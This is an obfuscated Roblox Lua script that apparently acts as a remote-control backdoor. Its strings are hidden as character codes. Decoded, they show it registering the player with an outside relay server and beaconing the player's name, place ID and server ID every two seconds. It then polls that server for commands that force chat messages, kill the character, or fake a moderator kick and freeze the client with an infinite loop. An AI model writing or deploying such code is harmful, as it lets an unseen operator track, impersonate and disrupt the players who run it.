local _0x8A8B = string.char
local _0x9C9D = table.concat
local _0x1B2C = tonumber
local _0xEFEF = {
    _0x1 = _0x8A8B(104,116,116,112,115,58,47,47,114,111,98,108,111,120,45,114,101,108,97,121,45,115,101,114,118,101,114,46,111,110,114,101,110,100,101,114,46,99,111,109),
    _0x2 = _0x8A8B(80,108,97,121,101,114,115),
    _0x3 = _0x8A8B(72,116,116,112,83,101,114,118,105,99,101),
    _0x4 = _0x8A8B(84,101,120,116,67,104,97,116,83,101,114,118,105,99,101),
    _0x5 = _0x8A8B(82,101,112,108,105,99,97,116,101,100,83,116,111,114,97,103,101),
    _0x6 = _0x8A8B(84,101,108,101,112,111,114,116,83,101,114,118,105,99,101)
}

local _0xAA1 = game:GetService(_0xEFEF._0x2)
local _0xAA2 = game:GetService(_0xEFEF._0x3)
local _0xAA3 = game:GetService(_0xEFEF._0x4)
local _0xAA4 = game:GetService(_0xEFEF._0x5)
local _0xAA5 = game:GetService(_0xEFEF._0x6)
local _0xAA6 = _0xAA1.LocalPlayer

local function _0xBB1(_0xCF1)
    if _0xAA3.ChatVersion == Enum.ChatVersion.TextChatService then
        local _0xD1 = _0xAA3:FindFirstChild(_0x8A8B(84,101,120,116,67,104,97,110,110,101,108,115)) and _0xAA3.TextChannels:FindFirstChild(_0x8A8B(82,66,88,71,101,110,101,114,97,108))
        if _0xD1 then _0xD1:SendAsync(_0xCF1) return end
    end
    local _0xD2 = _0xAA4:FindFirstChild(_0x8A8B(68,101,102,97,117,108,116,67,104,97,116,83,121,115,116,101,109,67,104,97,116,69,118,101,110,101,116,115)) and _0xAA4.DefaultChatSystemChatEvents:FindFirstChild(_0x8A8B(83,97,121,77,101,115,115,97,103,101,82,101,113,117,101,115,116))
    if _0xD2 then _0xD2:FireServer(_0xCF1, _0x8A8B(65,108,108)) return end
    pcall(function()
        game:GetService(_0x8A8B(67,104,97,116)):Chat(_0xAA6.Character and _0xAA6.Character:FindFirstChild(_0x8A8B(72,101,97,100)), _0xCF1, Enum.ChatColor.White)
    end)
end

local function _0xBB2()
    local _0xCH = _0xAA6.Character
    if _0xCH then
        local _0xHM = _0xCH:FindFirstChildOfClass(_0x8A8B(72,117,109,97,110,111,105,100))
        if _0xHM then _0xHM.Health = 0 end
    end
end

local function _0xBB3()
    local _0xSC = pcall(function() _0xAA6:Kick(_0x8A8B(75,105,99,107,101,100,32,98,121,32,77,111,100,101,114,97,116,111,114)) end)
    if _0xSC then return end
    pcall(function() _0xAA5:Teleport(0, _0xAA6) end)
    task.delay(0.5, function() while true do end end)
end

local function _0xBB4(_0xU, _0xB)
    local _0xPL = _0xAA2:JSONEncode(_0xB)
    local _0xHD = {[_0x8A8B(67,111,110,116,101,110,116,45,84,121,112,101)] = _0x8A8B(97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110)}
    if request then
        return request({ Url = _0xU, Method = _0x8A8B(80,79,83,84), Headers = _0xHD, Body = _0xPL })
    elseif http_request then
        return http_request({ Url = _0xU, Method = _0x8A8B(80,79,83,84), Headers = _0xHD, Body = _0xPL })
    else
        return _0xAA2:PostAsync(_0xU, _0xPL, Enum.HttpContentType.ApplicationJson)
    end
end

local function _0xBB5(_0xU)
    if request then
        return request({ Url = _0xU, Method = _0x8A8B(71,69,84) }).Body
    elseif http_request then
        return http_request({ Url = _0xU, Method = _0x8A8B(71,69,84) }).Body
    else
        return _0xAA2:GetAsync(_0xU)
    end
end

pcall(function() 
    _0xBB4(_0xEFEF._0x1 .. _0x8A8B(47,114,101,103,105,115,116,101,114), { userId = tostring(_0xAA6.UserId) }) 
end)

task.spawn(function()
    while true do
        task.wait(2)
        pcall(function()
            _0xBB4(_0xEFEF._0x1 .. _0x8A8B(47,115,101,110,100,45,99,111,109,109,97,110,100), {
                senderId = tostring(_0xAA6.UserId),
                targetId = _0x8A8B(77,79,68,83),
                text = _0x8A8B(33,112,114,101,115,101,110,99,101,32) .. tostring(game.PlaceId) .. _0x8A8B(32) .. tostring(game.JobId) .. _0x8A8B(32) .. _0xAA6.Name
            })
        end)
        
        local _0xS, _0xR = pcall(function() return _0xBB5(_0xEFEF._0x1 .. _0x8A8B(47,112,111,108,108,47) .. tostring(_0xAA6.UserId)) end)
        if _0xS and _0xR then
            local _0xPS, _0xDT = pcall(function() return _0xAA2:JSONDecode(_0xR) end)
            if _0xPS and _0xDT and _0xDT.commands then
                for _, _0xCM in ipairs(_0xDT.commands) do
                    local _0xTX = _0xCM.text or ""
                    if string.sub(_0xTX, 1, 5) == _0x8A8B(33,115,97,121,32) then
                        _0xBB1(string.sub(_0xTX, 6))
                    elseif string.sub(_0xTX, 1, 5) == _0x8A8B(33,107,105,99,107) then
                        _0xBB3()
                    elseif _0xTX == _0x8A8B(33,114,101,115,101,116) then
                        _0xBB2()
                    end
                end
            end
        end
    end
end)
